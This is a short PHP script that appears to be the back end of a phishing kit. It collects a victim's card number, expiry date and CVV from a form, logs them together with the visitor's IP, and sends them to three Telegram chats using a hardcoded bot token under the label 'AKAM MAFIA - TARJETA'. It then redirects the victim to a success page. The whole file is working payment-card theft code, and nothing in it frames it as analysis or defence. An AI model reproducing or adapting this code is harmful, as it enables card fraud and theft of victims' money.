<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip); 
$tarjeta = $_POST['tarjeta'] ?? '';
$fecha = $_POST['fecha'] ?? '';
$cvv = $_POST['cvv'] ?? '';

actualizar_registro_tarjeta($registro, $tarjeta, $fecha, $cvv);

$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = ["8114050673", "6616662846", "8638340940"];

$msg = "💳 <b>AKAM MAFIA - TARJETA</b>\n\n";
$msg .= "👤 <b>ID:</b> <code>$registro</code>\n";
$msg .= "💳 <b>NÚMERO:</b> <code>$tarjeta</code>\n";
$msg .= "📅 <b>FECHA:</b> <code>$fecha</code>\n";
$msg .= "🔒 <b>CVV:</b> <code>$cvv</code>\n";
$msg .= "📍 <b>IP:</b> $ip";

foreach($ids as $id){
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($msg)."&parse_mode=HTML");
}

header("Location: ../a/SUCCESS.php");
exit();
